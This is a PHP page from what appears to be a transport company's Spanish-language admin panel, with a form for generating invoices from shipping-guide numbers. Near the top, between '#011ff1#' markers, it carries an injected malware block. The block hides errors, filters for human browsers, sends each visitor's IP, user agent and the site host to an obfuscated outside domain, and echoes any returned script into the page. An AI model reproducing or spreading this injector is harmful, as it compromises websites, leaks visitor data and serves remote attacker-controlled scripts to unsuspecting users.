<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.php");
	}	
	
	include("../conexion/ajax.php");
	require("../conexion/config.php");
	require("../conexion/baseDatos.php");
	
	/*$guiaR = $_GET["guiaRemision"];	
	$codComp = $_GET["codC"];*/
?>
<?php
#011ff1#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/011ff1#
?>
<script language="javascript" type="text/javascript">
	function buscarComp()
	{
		agregarCargando('cargando');		
		nroGuia = document.getElementById("textNroGuiaRem").value;
		if(nroGuia.length==0)
		{
			alert("¡ Debe ingresar un numero de Guia de Remision !");
			quitarCargando('cargando');		
			return;						
		}
		_obj = crearObjeto();			
		_url = "ajaxManejador.php";
		_valores = "op=buscarCompGuia&nroGuia=" + nroGuia;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			if(_obj.readyState==4)
			{
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					if(resp=="not_found")
					{
						alert("¡ No existe una guia de remision con tal número o ya se le a creado la factura !");
						document.getElementById("textNroGuiaRem").value = "";
						document.getElementById("fecha").innerHTML = "";
						document.getElementById("total").innerHTML = "";
						document.getElementById("dirOrigen").innerHTML = "";
						document.getElementById("dirDestino").innerHTML = "";
						document.getElementById("codC").value = "";
						document.getElementById("guiaRemision").value = "";
					}
					else
					{
						resp = resp.split("*");
						document.getElementById("fecha").innerHTML = resp[0];
						document.getElementById("total").innerHTML = resp[1];
						document.getElementById("dirOrigen").innerHTML = resp[2];
						document.getElementById("dirDestino").innerHTML = resp[3];
						document.getElementById("codC").value = resp[4];
						document.getElementById("guiaRemision").value = nroGuia;
					}
					quitarCargando('cargando');	
				}
			}
		}
	}
	function validar()
	{
		agregarCargando('cargando');		
		numero = document.getElementById("txtNumero").value;
		nroGuia = document.getElementById("textNroGuiaRem").value;
		
		if(numero.length==0 || nroGuia.length==0)
		{
			alert("¡ Todos los campos deben estar llenos !");
			quitarCargando('cargando');		
			return;	
		}
		document.getElementById("form1").submit();
	}
	
	function go()
	{
		location.href="administrador.php";
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<!-- TemplateBeginEditable name="doctitle" -->
<title>:: Transportes Marin Hermanos - GenerarComprobante ::</title>
<!-- TemplateEndEditable -->
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
-->
</style>
<!-- TemplateBeginEditable name="head" --><!-- TemplateEndEditable -->
</head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="263"><div align="center">
          <form id="form1" name="form1" method="POST" action="admin.php">
            <p>&nbsp;</p>
            <table width="410" border="0">
			<tr>
                <td height="52" colspan="3"><div align="center"><strong>GENERAR COMPROBANTE</strong></div></td>
                </tr>
              <tr>
                <td height="34"><em><strong>Nro Guia Remision :</strong></em></td>
                <td><label>
                  <input name="textNroGuiaRem" type="text" id="textNroGuiaRem" />
                </label></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="41">&nbsp;</td>
                <td><label>
                  <input name="Buscar" type="button" id="Buscar" value="Buscar" onclick="buscarComp()" />
                </label></td>
                <td><div align="center" id="cargando"></div></td>
              </tr>
              <tr>
                <td height="31"><em><strong>Fecha : </strong></em></td>
                <td><div align="justify" id="fecha"></div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="28"><em><strong>Total : </strong></em></td>
                <td><div align="justify" id="total"></div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="32"><em><strong>Dir. Origen : </strong></em></td>
                <td><div align="justify" id="dirOrigen"></div></td>
                <td>&nbsp;</td>
              </tr>
			  <tr>
                <td height="31"><em><strong>Dir. Destino : </strong></em></td>
                <td><div align="justify" id="dirDestino"></div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <th height="43" colspan="3" scope="col">DATOS DEL COMPROBANTE </th>
                </tr>
              <tr>
                <td width="160"><em><strong>Serie :</strong></em></td>
                <td width="157"><select name="cmbSerie" id="cmbSerie">
                  <option value="001">001</option>
                  <option value="002">002</option>
                </select>                </td>
                <td width="79">&nbsp;</td>
              </tr>
              <tr>
                <td height="39"><em><strong>Numero : </strong></em></td>
                <td><input name="txtNumero" type="text" id="txtNumero" /></td>
                <td>&nbsp;</td>
              </tr>
			   <tr>
                <td><em><strong>Tipo : </strong></em></td>
                <td><label>
                  <select name="select" id="select">
                    <option value="Factura">Factura</option>
                    <option value="Boleta">Boleta</option>
                    <option value="Almacen">Almacen</option>
                  </select>
                </label></td>
                <td>&nbsp;</td>
			   </tr>
              <tr>
                <td><input type="hidden" id="guiaRemision" name="guiaRemision"/></td>
                <td><input type="hidden" id="codC" name="codC"/>
                  <label>
                  <input type="hidden" name="op" value="clasificarComp" />
                  </label></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><div align="center">
                  <input name="Generar" type="button" id="Generar" value="Generar"  onclick="validar()"/>
                </div></td>
                <td colspan="2"><div align="center">
                  <input name="cancelar" type="button" id="cancelar" value="Cancelar" onClick="go()" />
                </div></td>
                </tr>   
			  <tr>
                <td colspan="3">&nbsp;</td>
                </tr>           
            </table>
              </form>
          </div></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>